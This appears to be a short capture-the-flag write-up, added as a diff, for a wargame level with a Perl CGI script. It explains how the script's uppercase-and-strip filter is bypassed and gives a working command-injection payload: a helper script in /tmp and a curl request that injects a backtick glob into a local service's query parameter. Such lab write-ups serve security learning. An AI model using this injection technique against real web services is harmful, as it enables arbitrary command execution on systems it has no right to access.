@@ -1,0 +1,12 @@
+in level12 file there is a perl CGI script
+The script transform the user input:
+  $xx =~ tr/a-z/A-Z/;  --> Uppercase
+  $xx =~ s/\s.*//; --> discard everything after the fisrt whitespace
+We need to find a path to our script without space or lowercase characters.
+Perl use backtick operator to call system
+
+Let's write a script /tmp/GETFLAG :
+#!/bin/sh                
+/bin/getflag > /tmp/flag 
+
+chmod +x /tmp/GETFLAG && curl '127.0.0.1:4646?x=`/*/GETFLAG`' ; cat /tmp/flag
